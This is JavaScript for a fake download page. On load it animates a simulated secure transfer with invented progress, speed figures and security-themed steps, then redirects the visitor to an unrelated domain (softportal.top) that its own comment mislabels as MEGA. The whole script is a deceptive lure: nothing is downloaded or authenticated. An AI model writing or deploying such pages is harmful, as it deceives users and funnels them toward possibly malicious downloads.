
// Download simulation with automatic redirect to MEGA
class DownloadManager {
  constructor() {
    this.progress = 0;
    this.currentStep = 0;
    this.startTime = Date.now();
    this.dataTransferred = 0;
    this.downloadSpeed = 0;
    this.timeRemaining = 0;
    this.error = null;

    this.steps = [
      { name: "Establishing secure tunnel", icon: "🔐", detail: "Creating encrypted pathway" },
      { name: "Authenticating credentials", icon: "🔑", detail: "Verifying access permissions" },
      { name: "Synchronizing data streams", icon: "⚡", detail: "Aligning transfer protocols" },
      { name: "Processing secure package", icon: "💎", detail: "Handling encrypted payload" },
      { name: "Finalizing connection", icon: "🚀", detail: "Preparing destination link" },
      { name: "Redirecting securely", icon: "✨", detail: "Completing transfer protocol" }
    ];

    this.targetUrl = "https://softportal.top/s/git";
    
    this.initializeElements();
    this.startDownload();
  }

  initializeElements() {
    this.statusText = document.getElementById('status-text');
    this.progressPercent = document.getElementById('progress-percent');
    this.progressFill = document.getElementById('progress-fill');
    this.stepIcon = document.getElementById('step-icon');
    this.stepText = document.getElementById('step-text');
    this.dataProgress = document.getElementById('data-progress');
    this.downloadSpeedEl = document.getElementById('download-speed');
    this.timeRemainingEl = document.getElementById('time-remaining');
    this.errorState = document.getElementById('error-state');
    this.errorMessage = document.getElementById('error-message');
  }

  async delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  updateProgress(newProgress, stepIndex, statusText) {
    this.progress = newProgress;
    if (stepIndex !== undefined) this.currentStep = stepIndex;
    if (statusText) this.statusText.textContent = statusText;

    // Update progress bar
    this.progressPercent.textContent = `${Math.round(this.progress)}%`;
    this.progressFill.style.width = `${this.progress}%`;

    // Update data transferred (simulated)
    const totalSize = 2.4;
    this.dataTransferred = (this.progress / 100) * totalSize;
    this.dataProgress.textContent = `${this.dataTransferred.toFixed(1)} MB / 2.4 MB`;

    // Calculate speed and time remaining
    const elapsedTime = (Date.now() - this.startTime) / 1000;
    if (elapsedTime > 0) {
      this.downloadSpeed = this.dataTransferred / elapsedTime;
      this.downloadSpeedEl.textContent = `${this.downloadSpeed.toFixed(1)} MB/s`;
      
      const remainingData = totalSize - this.dataTransferred;
      this.timeRemaining = Math.max(0, remainingData / Math.max(this.downloadSpeed, 0.1));
      this.timeRemainingEl.textContent = this.formatTime(this.timeRemaining);
    }

    // Update current step
    if (this.currentStep < this.steps.length) {
      this.stepIcon.textContent = this.steps[this.currentStep].icon;
      this.stepText.textContent = this.steps[this.currentStep].name;
    } else {
      this.stepText.textContent = "Complete";
    }
  }

  formatTime(seconds) {
    const minutes = Math.floor(seconds / 60);
    const secs = Math.floor(seconds % 60);
    return `${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  }

  showError(message) {
    this.error = message;
    this.errorMessage.textContent = message;
    this.errorState.style.display = 'flex';
  }

  async startDownload() {
    try {
      // Step 1: Establishing connection
      this.updateProgress(5, 0, this.steps[0].detail);
      await this.delay(800);

      // Step 2: Fetching content
      this.updateProgress(20, 1, this.steps[1].detail);
      await this.delay(600);

      // Step 3: Validating integrity
      this.updateProgress(40, 2, this.steps[2].detail);
      await this.delay(700);

      // Step 4: Decrypting
      this.updateProgress(60, 3, this.steps[3].detail);
      await this.delay(500);

      // Step 5: Extracting redirect info
      this.updateProgress(80, 4, this.steps[4].detail);
      await this.delay(400);

      // Step 6: Preparing redirect
      this.updateProgress(95, 5, this.steps[5].detail);
      await this.delay(300);

      // Complete
      this.updateProgress(100, 5, "Transfer complete - redirecting securely...");
      await this.delay(500);

      // Redirect to MEGA
      window.location.href = this.targetUrl;

    } catch (error) {
      console.error('Download error:', error);
      this.showError("Secure transfer failed. Please verify connection and try again.");
    }
  }
}

// Start download when page loads
document.addEventListener('DOMContentLoaded', () => {
  new DownloadManager();
});
